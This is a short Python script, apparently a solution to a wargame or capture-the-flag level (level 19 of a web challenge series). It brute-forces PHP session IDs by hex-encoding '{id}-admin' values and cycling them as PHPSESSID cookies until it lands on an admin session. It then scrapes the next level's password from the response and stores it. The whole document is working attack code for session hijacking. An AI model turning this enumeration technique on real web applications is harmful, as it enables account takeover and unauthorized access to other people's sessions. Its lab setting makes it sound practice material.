import Auther
import binascii


def format(id: int):
    return binascii.hexlify(f'{id}-admin'.encode()).decode()


for seesionid in range(1, 640):
    # 281
    print(f"Progress: {seesionid}/640: {format(seesionid)}")
    r = Auther.request(19, data={"username": "FOO",
                                 "password": "BAR"},
                       cookies={"PHPSESSID": f'{format(seesionid)}'})
    # print(r.text)
    if "You are an admin" in r.text:
        print(f"Admin session id: {seesionid}")
        psw = next((line for line in r.text.splitlines() if line.startswith(
            "Password: ")), "").split(":")[1].strip()[0:32]
        Auther.updateAuth(20, psw)
        print(psw)
        break
